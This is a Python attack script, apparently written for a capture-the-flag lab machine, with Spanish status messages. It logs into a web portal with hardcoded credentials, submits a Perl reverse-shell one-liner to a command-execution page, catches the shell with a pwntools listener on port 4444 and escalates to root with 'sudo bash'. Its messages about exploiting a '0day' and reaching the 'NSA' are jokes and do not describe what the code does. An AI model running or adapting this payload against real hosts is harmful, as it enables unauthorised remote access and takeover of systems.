import requests
import time
import signal
import threading
from pwn import *
import sys

def def_handler(sig, frame):
	print("\n[!] Saliendo... \n")
	sys.exit(1)

# ctrl_c
signal.signal(signal.SIGINT, def_handler)

# variables globales
login_url = "http://10.10.174.15/login.php"
commands_url = "http://10.10.174.15/portal.php"
burp = {"http" : "127.0.0.1:8080"}
lport=4444

def make_request():
	s=requests.session()

	data_post = {
		"username" : "R1ckRul3s",
		"password" : "Wubbalubbadubdub",
		"sub" : "Login"
	}

	command_post = {
		"command" : """perl -e 'use Socket;$i="10.9.102.237";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
		"sub" : "Execute"
	}

	s.post(login_url, data=data_post) #  proxies=burp
	response = s.post(commands_url,data=command_post)

#	print(response.text)

if __name__ == "__main__":
	try:
		threading.Thread(target=make_request, args=()).start()
	except Exception as e:
		log.error(str(e))

	p1 = log.progress("Ganando acceso al sistema")

	shell = listen(lport, timeout=20).wait_for_connection()

	if shell.sock is None:
		p1.failure("NO se ha ganado acceso al sistema")
		sys.exit(0)
	else:
		p1.success("Se ha ganado acceso al sistema como el usuario www-data")

	p2 = log.progress("Esalada de privilegios")
	p2.status("Explotando 0day en el sistema para convertirnos en root")
	time.sleep(2)

	p2.success("Acceso a la NSA como root")

	shell.sendline("sudo bash")
	shell.interactive()
